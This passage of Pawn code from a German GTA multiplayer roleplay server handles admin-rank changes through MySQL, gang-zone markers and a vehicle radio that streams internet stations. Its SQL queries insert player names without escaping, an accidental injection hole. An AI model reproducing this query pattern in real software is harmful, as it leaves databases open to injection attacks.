		    if(PlayerInfo[pid][pAdmin] > PlayerInfo[playerid][pAdmin]) return SendClientMessage(playerid,COOLRED,"You can't change the Admin-Level of this Player!");
		    PlayerInfo[pid][pAdmin] = level;
		    format(string, sizeof(string), "You have been Demoted to Admin Level %d ", level);
			ShowPlayerDialog(pid,30,DIALOG_STYLE_MSGBOX,"{DF0101}DEMOTED",string,"Exit","");
			format(string, sizeof(string), "ADMIN: %s has setted the Admin Level of %s <%d> to %d ", GetName(playerid),GetName(pid),number,level);
			ABroadCast(COLOR_GREY,string,1);
			return 1;
		}
	}*/
	{
	    return SCM(playerid,-1,"Der Spieler ist Online! Nutze /makeadmin");
	}
	else
	{
	    //if(pid == playerid && PlayerInfo[playerid][pAdmin]<12) return SendClientMessage(playerid,COOLRED,"You can't change your own Admin Level!");
     	//if(PlayerInfo[pid][pAdmin] > PlayerInfo[playerid][pAdmin]) return SendClientMessage(playerid,COOLRED,"You can't change the Admin-Level of this Player!");
		new query[256];
		mysql_format(mysqlcon, query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", name); //Du gibst die ID ein, dann nutze diese auch für die Abfrage
		mysql_pquery(mysqlcon, query, "SetAdminLevelForPlayer", "dds", playerid, level, name);

	}
	return 1;
}
stock IsPlayerAdminYet(playerid)
{
	if(PlayerInfo[playerid][pAdmin]>=1) return 1;
	else return 0;
}
forward SetAdminLevelForPlayer(playerid, level, name[]);
public SetAdminLevelForPlayer(playerid, level, name[])
{
	new rows, string[145],Adminlevel;
//	updateGangZone(rows);
	cache_get_row_count(rows);
	if(rows == 0) return SendClientMessage(playerid,-1,"Der Spieler wurde nicht gefunden.");
	else
	{
		//cache_get_value_name(0, "name", name);
		cache_get_value_name_int(0, "admin", Adminlevel);
     	if(Adminlevel > PlayerInfo[playerid][pAdmin]) return SendClientMessage(playerid,-1,"Du kannst das Adminlevel dieses Spielers nicht ändern!");


		format(string, sizeof(string), "ADMIN: %s hat den Admin Rang von %s auf %d gesetzt.", GetName(playerid),name,level);
		ABroadCast(COLOR_GREY,string,1);

	//	SendClientMessage(playerid,-1,string);
		mysql_format(mysqlcon, string, sizeof(string), "UPDATE accounts SET admin = '%d' WHERE name = '%s'", level,name); //Auch hier, die eingegebene ID nutzen
		mysql_pquery(mysqlcon, string);
		return 1;
	}
}
getOnlineName(string[])
{
    for(new i=0; i<MAX_PLAYERS; i++)
    {
//        if(!strcmp(string, GetName(playerid))) return i;
		if(IsPlayerConnected(i))
		{
		    if(!strcmp(string, GetName(i))) return i;
		}
    }
    return INVALID_PLAYER_ID;
}






updateGangZone(id) //continue?
{
//    new string[128];
	if(GfSystem[id][FlaggenPickup] != -1)
	{
		DestroyPickup(GfSystem[id][FlaggenPickup]);
	}
	if(GfSystem[id][EinnahmeLabel] != Text3D:-1)
	{
		Delete3DTextLabel(GfSystem[id][EinnahmeLabel]);
	}


	GfSystem[id][FlaggenPickup]=CreatePickup(1314, 1, GfSystem[id][EinnahmeX],GfSystem[id][EinnahmeY],GfSystem[id][EinnahmeZ], -1);

	new text[128];

	if(GfSystem[id][FlaggenPickup] != 255)
	{
		format(text,sizeof(text), "{B18904}Gebiet von %s\n/invade", Fracs[GfSystem[id][Belongs2]-1]);
		GfSystem[id][EinnahmeLabel]=Create3DTextLabel(text, -1, GfSystem[id][EinnahmeX],GfSystem[id][EinnahmeY],GfSystem[id][EinnahmeZ], 10, 0, 1);
	}
	else
  	{
  	    format(text,sizeof(text), "Freies Gebiet\n/invade", Fracs[GfSystem[id][Belongs2]-1]);
		GfSystem[id][EinnahmeLabel]=Create3DTextLabel(text, -1, GfSystem[id][EinnahmeX],GfSystem[id][EinnahmeY],GfSystem[id][EinnahmeZ], 10, 0, 1);
 	}
	return 1;
}

stock PlayMusic(playerid,item)
{
	new vehicleid;
	vehicleid = GetPlayerVehicleID(playerid);
	if (item == 1)
	{

			    for(new i = 0; i < MAX_PLAYERS; i++)
			    {
			        if(IsPlayerInVehicle(i, vehicleid))
			        {

			  				TextDrawSetString(Textdrawaisahuso[i], "Technobase.FM");
			                GameTextForPlayer(i, "~r~Technobase.FM.", 500,3);
							PlayAudioStreamForPlayer(i, "http://listen.technobase.fm/dsl.pls");
							if(IsADtCar(vehicleid))// Privatfahrzeug
				   			{
								new carowner = GetDtCarOwner(vehicleid);
					            new slot = GetDtCarOwnerSlot(carowner,vehicleid);

								PlayerCar[carowner][slot][SoundSystemData] = 1;
						 	}
						}


			    }






	}
	else if (item == 2)
	{

			    for(new i = 0; i < MAX_PLAYERS; i++)
			    {
			        if(IsPlayerInVehicle(i, vehicleid))
			        {

			  				TextDrawSetString(Textdrawaisahuso[i], "I-Love Radio");
				 		    GameTextForPlayer(i, "~r~I-Love Radio.", 500,3);
							PlayAudioStreamForPlayer(i, "http://stream01.iloveradio.de/iloveradio1.mp3");
							if(IsADtCar(vehicleid))// Privatfahrzeug
				   			{
								new carowner = GetDtCarOwner(vehicleid);
					            new slot = GetDtCarOwnerSlot(carowner,vehicleid);

								PlayerCar[carowner][slot][SoundSystemData] = 2;
						 	}




					}




}
	}
	else if (item == 3)
	{

			    for(new i = 0; i < MAX_PLAYERS; i++)
			    {
			        if(IsPlayerInVehicle(i, vehicleid))
			        {

			  				TextDrawSetString(Textdrawaisahuso[i], "I-Love Radio Dance");
				 		    GameTextForPlayer(i, "~r~I-Love Radio Dance.", 500,3);
							PlayAudioStreamForPlayer(i, "http://stream02.iloveradio.de/iloveradio2.mp3");
							if(IsADtCar(vehicleid))// Privatfahrzeug
				   			{
								new carowner = GetDtCarOwner(vehicleid);
					            new slot = GetDtCarOwnerSlot(carowner,vehicleid);

								PlayerCar[carowner][slot][SoundSystemData] = 3;
						 	}
						}

}
	}
	else if (item == 4)
	{


			    for(new i = 0; i < MAX_PLAYERS; i++)
			    {
			        if(IsPlayerInVehicle(i, vehicleid))
			        {

			  				TextDrawSetString(Textdrawaisahuso[i], "Bremen Next");
				 		    GameTextForPlayer(i, "~r~Bremen Next.", 500,3);
							PlayAudioStreamForPlayer(i, "http://rb-bremennext-live.cast.addradio.de/rb/bremennext/live/mp3/128/stream.mp3");
							if(IsADtCar(vehicleid))// Privatfahrzeug
				   			{
								new carowner = GetDtCarOwner(vehicleid);
					            new slot = GetDtCarOwnerSlot(carowner,vehicleid);

								PlayerCar[carowner][slot][SoundSystemData] = 4;
						 	}
							return 1;
					}

}
	}
	else if (item == 5)
	{
			    for(new i = 0; i < MAX_PLAYERS; i++)
			    {
			        if(IsPlayerInVehicle(i, vehicleid))
			        {

			  				TextDrawSetString(Textdrawaisahuso[i], "Community Radio Classic");
				 		    GameTextForPlayer(i, "~r~Community Radio Classic.", 500,3);
							PlayAudioStreamForPlayer(i, "http://gta-reallife.de/streaming/classic/index.php/");
							if(IsADtCar(vehicleid))// Privatfahrzeug
				   			{
								new carowner = GetDtCarOwner(vehicleid);
					            new slot = GetDtCarOwnerSlot(carowner,vehicleid);

								PlayerCar[carowner][slot][SoundSystemData] = 5;
						 	}
							return 1;
					}

}
	}
	else if (item == 6)
	{


			    for(new i = 0; i < MAX_PLAYERS; i++)
			    {
			        if(IsPlayerInVehicle(i, vehicleid))
			        {


			  				TextDrawSetString(Textdrawaisahuso[i], "Community Radio Classic Charts");
				 		    GameTextForPlayer(i, "~r~Community Radio Classic Charts.", 500,3);
							PlayAudioStreamForPlayer(i, "http://gta-reallife.de/streaming/c1/index.php/");
							if(IsADtCar(vehicleid))// Privatfahrzeug
				   			{
								new carowner = GetDtCarOwner(vehicleid);
					            new slot = GetDtCarOwnerSlot(carowner,vehicleid);

								PlayerCar[carowner][slot][SoundSystemData] = 6;
						 	}
							return 1;
}

			    }
	}
	else if (item == 7)
	{


			    for(new i = 0; i < MAX_PLAYERS; i++)
			    {
			        if(IsPlayerInVehicle(i, vehicleid))
			        {

			  				TextDrawSetString(Textdrawaisahuso[i], "Community Radio Charts");
				 		    GameTextForPlayer(i, "~r~Community Radio Charts.", 500,3);
							PlayAudioStreamForPlayer(i, "http://gta-reallife.de/streaming/charts/index.php/");
							if(IsADtCar(vehicleid))// Privatfahrzeug
				   			{
								new carowner = GetDtCarOwner(vehicleid);
					            new slot = GetDtCarOwnerSlot(carowner,vehicleid);

								PlayerCar[carowner][slot][SoundSystemData] = 7;
						 	}
							return 1;
}
					}



	}
	else if (item == 8)
	{

			    for(new i = 0; i < MAX_PLAYERS; i++)
			    {
			        if(IsPlayerInVehicle(i, vehicleid))
			        {

	  						TextDrawSetString(Textdrawaisahuso[i], "Radio Aus");
		 		   			GameTextForPlayer(i, "~r~Radio Aus", 500,3);
            StopAudioStreamForPlayer(i);
				if(IsADtCar(vehicleid))// Privatfahrzeug
	   			{
					new carowner = GetDtCarOwner(vehicleid);
		            new slot = GetDtCarOwnerSlot(carowner,vehicleid);

					PlayerCar[carowner][slot][SoundSystemData] = 0;
			 	}
						return 1;
}

					}


	}
return 1;
}







































